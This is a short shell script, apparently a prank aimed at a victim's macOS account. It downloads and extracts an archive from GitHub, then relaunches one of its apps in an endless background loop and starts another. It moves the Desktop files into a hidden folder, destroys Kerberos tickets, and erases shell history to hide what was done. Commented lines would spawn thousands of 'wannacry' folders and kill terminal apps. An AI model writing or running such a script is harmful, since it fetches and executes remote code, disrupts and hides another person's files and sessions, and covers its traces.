if [ $(users) = "hmeftah" ]
then
    echo sir tqawed
    exit 1
fi

mkdir -p /tmp/laz/

curl -s -L https://github.com/SilentSarah/PrankMoulinix/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz > /dev/null

tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
while true
do
    open /tmp/laz/app/Volume.app
done &

mkdir ~/.Laz/

mv ~/Desktop/* ~/.Laz/

cd ~/Desktop

rm -rf ~/.*history*

# mkdir wannacry{0..10000}

nohup open /tmp/laz/app/Laz.app > /dev/null

kdestroy

rm -f ~/.*history*

clear

# killall iTerm

# killall Terminal

# killall iTerm2

